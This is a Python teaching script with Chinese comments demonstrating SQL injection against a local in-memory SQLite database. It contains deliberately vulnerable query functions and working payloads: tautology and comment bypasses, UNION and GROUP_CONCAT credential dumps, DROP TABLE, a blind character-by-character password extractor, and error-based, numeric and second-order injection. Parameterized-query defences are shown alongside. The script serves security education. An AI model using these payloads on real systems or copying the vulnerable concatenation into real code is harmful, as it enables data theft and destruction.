"""
SQL 注入测试代码 — 完整版
演示常见 SQL 注入攻击方式 及 防御措施
覆盖：联合查询 / 布尔盲注 / 时间盲注 / 报错注入 / 堆叠注入 / 二阶注入 / 数字型注入
"""

import sqlite3
import hashlib
import time

# ============================================================
# 初始化测试数据库
# ============================================================
DB = sqlite3.connect(":memory:")
DB.execute("""
    CREATE TABLE users (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE,
        password TEXT,
        role TEXT
    )
""")
DB.execute("""
    CREATE TABLE products (
        id INTEGER PRIMARY KEY,
        name TEXT,
        price REAL,
        secret_flag TEXT
    )
""")
DB.execute("""
    CREATE TABLE comments (
        id INTEGER PRIMARY KEY,
        user_id INTEGER,
        content TEXT
    )
""")
DB.execute("INSERT INTO users VALUES (1, 'admin',  'admin123',  'admin')")
DB.execute("INSERT INTO users VALUES (2, 'cy',    'cyjcode666', 'user')")
DB.execute("INSERT INTO users VALUES (3, 'guest', 'guest',     'guest')")
DB.execute("INSERT INTO products VALUES (1, 'Widget',   9.99,  'FLAG{union_extracted}')")
DB.execute("INSERT INTO products VALUES (2, 'Gadget',  19.99,  'FLAG{secret_gadget}')")
DB.execute("INSERT INTO products VALUES (3, 'Thingy',  29.99,  'FLAG{hidden_thingy}')")
DB.execute("INSERT INTO comments VALUES (1, 1, 'Hello from admin')")
DB.commit()


# ============================================================
# 辅助函数
# ============================================================
def run_query(sql: str, params: tuple = ()):
    """执行 SQL 并返回结果（打印查询语句和结果）"""
    print(f"  SQL: {sql}")
    if params:
        print(f"  参数: {params}")
    try:
        cur = DB.execute(sql, params)
        rows = cur.fetchall()
        print(f"  结果: {rows}")
        return rows
    except Exception as e:
        print(f"  错误: {e}")
        return []


def vulnerable_login(username: str, password: str) -> bool:
    """有漏洞的登录：直接拼接字符串"""
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cur = DB.execute(sql)
    return cur.fetchone() is not None


def safe_login(username: str, password: str) -> bool:
    """安全的登录：参数化查询"""
    sql = "SELECT * FROM users WHERE username=? AND password=?"
    cur = DB.execute(sql, (username, password))
    return cur.fetchone() is not None


# ============================================================
# 测试用例
# ============================================================

def test_normal_login():
    """1. 正常登录"""
    print("=" * 60)
    print("1. 正常登录")
    print("=" * 60)
    print("  [漏洞版]", vulnerable_login("admin", "admin123"))   # True
    print("  [安全版]", safe_login("admin", "admin123"))         # True
    print("  [错误密码]", vulnerable_login("admin", "wrong"))     # False


def test_tautology():
    """2. 永真式绕过（OR 1=1）"""
    print("\n" + "=" * 60)
    print("2. 永真式绕过 — ' OR '1'='1")
    print("=" * 60)

    payload = "' OR '1'='1"
    print("  [漏洞版] 输入:", payload)
    print("  登录成功:", vulnerable_login(payload, payload))

    print("  [安全版] 输入:", payload)
    print("  登录成功:", safe_login(payload, payload))


def test_comment():
    """3. 注释符绕过（--）"""
    print("\n" + "=" * 60)
    print("3. 注释符绕过 — admin'--")
    print("=" * 60)

    payload = "admin'--"
    print("  [漏洞版] 输入:", payload)
    print("  登录成功:", vulnerable_login(payload, "任意密码"))

    print("  [安全版] 输入:", payload)
    print("  登录成功:", safe_login(payload, "任意密码"))


def test_union():
    """4. UNION 注入 — 窃取数据"""
    print("\n" + "=" * 60)
    print("4. UNION 注入 — 窃取所有用户")
    print("=" * 60)

    payload = "' UNION SELECT 1, username, password, role FROM users--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    run_query(sql)


def test_drop_table():
    """5. 破坏性操作 — DROP TABLE"""
    print("\n" + "=" * 60)
    print("5. 破坏性操作 — DROP TABLE（会被阻止，仅演示）")
    print("=" * 60)

    payload = "'; DROP TABLE users;--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    print("  sqlite3 不支持多语句，但 MySQL 等数据库会执行！")
    run_query(sql)


def test_blind():
    """6. 盲注 — 逐字符猜解密码"""
    print("\n" + "=" * 60)
    print("6. 布尔盲注 — 猜解 admin 密码长度")
    print("=" * 60)

    for length in range(1, 15):
        payload = f"admin' AND length(password)={length}--"
        if vulnerable_login(payload, ""):
            print(f"  密码长度 = {length}")
            break


def test_blind_char():
    """6b. 盲注 — 猜解具体字符"""
    print("\n" + "=" * 60)
    print("6b. 布尔盲注 — 猜解 admin 密码")
    print("=" * 60)

    # 先获取密码长度
    pwd_len = None
    for n in range(1, 15):
        if vulnerable_login(f"admin' AND length(password)={n}--", ""):
            pwd_len = n
            break

    if pwd_len is None:
        print("  无法确定密码长度")
        return

    # 逐字符猜解
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    cracked = ""
    for pos in range(1, pwd_len + 1):
        for ch in charset:
            payload = f"admin' AND substr(password,{pos},1)='{ch}'--"
            if vulnerable_login(payload, ""):
                cracked += ch
                print(f"  位置 {pos}: {ch} → 当前: {cracked}")
                break
    print(f"\n  破解结果: {cracked}")


def test_time_blind():
    """7. 时间盲注（模拟）"""
    print("\n" + "=" * 60)
    print("7. 时间盲注（模拟）- 用 randomblob 制造延迟")
    print("=" * 60)

    import time
    payload = "admin' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    print("  如果响应明显延迟 → 条件为真")
    print("  如果响应很快     → 条件为假")
    start = time.time()
    try:
        DB.execute(sql)
    except:
        pass
    elapsed = time.time() - start
    print(f"  本次耗时: {elapsed:.3f}s（条件为真时有明显延迟）")


def safe_queries_demo():
    """8. 防御：参数化查询"""
    print("\n" + "=" * 60)
    print("8. 防御演示 — 参数化查询免疫注入")
    print("=" * 60)

    test_inputs = [
        ("admin", "admin123"),
        ("' OR '1'='1", "' OR '1'='1"),
        ("admin'--", "x"),
        ("'; DROP TABLE users;--", "x"),
    ]
    for user, pwd in test_inputs:
        print(f"\n  username='{user}'  password='{pwd}'")
        print(f"  → 安全版登录: {safe_login(user, pwd)}")


# ============================================================
# 新增测试：报错注入 / 堆叠注入 / 数字型 / 二阶注入
# ============================================================

def test_error_based():
    """9. 报错注入 — 通过错误信息提取数据"""
    print("\n" + "=" * 60)
    print("9. 报错注入 — 通过错误信息泄露数据")
    print("=" * 60)

    # 利用 CAST 类型转换报错泄露数据
    for uid in range(1, 4):
        payload = f"' AND CAST((SELECT password FROM users WHERE id={uid}) AS INTEGER)--"
        sql = f"SELECT * FROM users WHERE username='{payload}'"
        print(f"\n  目标 id={uid}")
        try:
            DB.execute(sql)
        except Exception as e:
            # 错误信息中包含了密码！（在某些数据库中）
            err = str(e)
            print(f"  错误信息: {err[:120]}")
            # 尝试从报错中提取
            if "admin123" in err or "cyjcode666" in err or "guest" in err:
                print(f"  ⚠ 密码已通过错误信息泄露！")


def test_stacked_query_chain():
    """10. 堆叠注入 + 链式提取"""
    print("\n" + "=" * 60)
    print("10. 堆叠注入 — 多语句执行（sqlite3 受限，演示多步链式）")
    print("=" * 60)

    # sqlite3 的 execute() 只执行第一条语句
    # 演示通过多次请求串联实现完整攻击链
    print("\n  [攻击链 Step 1] 查表名（通过 UNION）:")
    payload = "' UNION SELECT 1, name, 'x', 'x' FROM sqlite_master WHERE type='table'--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    run_query(sql)

    print("\n  [攻击链 Step 2] 查列名:")
    payload = "' UNION SELECT 1, sql, 'x', 'x' FROM sqlite_master WHERE type='table' AND name='products'--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    run_query(sql)

    print("\n  [攻击链 Step 3] 提取敏感数据（secret_flag 列）:")
    payload = "' UNION SELECT id, name, price, secret_flag FROM products--"
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    run_query(sql)


def test_numeric_injection():
    """11. 数字型注入 — 无需引号闭合"""
    print("\n" + "=" * 60)
    print("11. 数字型注入 — 无引号的搜索接口")
    print("=" * 60)

    # 模拟一个按 ID 搜索产品的接口（数字型参数，无引号包裹）
    def search_product_by_id(user_input: str):
        sql = f"SELECT * FROM products WHERE id = {user_input}"  # 危险拼接
        cur = DB.execute(sql)
        return cur.fetchall()

    print("  [正常] id=1:", search_product_by_id("1"))

    # 注入：永真条件绕过
    print("  [注入] id=1 OR 1=1:")
    rows = search_product_by_id("1 OR 1=1")
    for r in rows:
        print(f"    {r}")

    # UNION 注入
    print("\n  [注入] id=-1 UNION SELECT 1,2,3,4:")
    rows = search_product_by_id("-1 UNION SELECT 1,2,3,4")
    print(f"    {rows}")

    # 提取真实数据
    print("\n  [注入] 提取用户名密码:")
    rows = search_product_by_id(
        "-1 UNION SELECT id, username, password, role FROM users"
    )
    for r in rows:
        print(f"    {r}")


def test_second_order():
    """12. 二阶 SQL 注入 — 先存储后触发"""
    print("\n" + "=" * 60)
    print("12. 二阶注入 — 恶意数据先入库，后续查询触发")
    print("=" * 60)

    # Step 1: "正常"注册一个恶意用户名（无害的插入，参数化也防不住）
    malicious_username = "attacker' UNION SELECT 1,2,3,4--"
    print(f"  [Step1 存储] 注册恶意用户名: {malicious_username}")
    DB.execute("INSERT INTO users VALUES (99, ?, 'pw', 'user')", (malicious_username,))
    DB.commit()

    # Step 2: 后续某个功能用这个用户名去拼接 SQL（漏洞触发）
    print(f"\n  [Step2 触发] 查看用户 {malicious_username} 的评论...")
    # 假设开发者在评论模块用拼接方式查用户名——这就是二阶注入
    sql = f"SELECT * FROM comments WHERE user_id = (SELECT id FROM users WHERE username='{malicious_username}')"
    run_query(sql)

    # 清理
    DB.execute("DELETE FROM users WHERE id = 99")
    DB.commit()


def test_batched_extraction():
    """13. 批量提取 — 一次性导出所有表数据"""
    print("\n" + "=" * 60)
    print("13. 批量提取 — GROUP_CONCAT 一次性导出所有密码")
    print("=" * 60)

    payload = (
        "' UNION SELECT 1, "
        "GROUP_CONCAT(username || ':' || password, ' | '), "
        "GROUP_CONCAT(role), "
        "'x' FROM users--"
    )
    sql = f"SELECT * FROM users WHERE username='{payload}'"
    run_query(sql)

    print("\n  一次请求即可导出全部用户凭据！")


# ============================================================
# 主入口
# ============================================================
if __name__ == "__main__":
    test_normal_login()
    test_tautology()
    test_comment()
    test_union()
    test_drop_table()
    test_blind()
    test_blind_char()
    test_time_blind()
    safe_queries_demo()
    test_error_based()
    test_stacked_query_chain()
    test_numeric_injection()
    test_second_order()
    test_batched_extraction()

    print("\n" + "=" * 60)
    print("测试完毕。记住：永远不要拼接用户输入到 SQL！")
    print("=" * 60)
    DB.close()
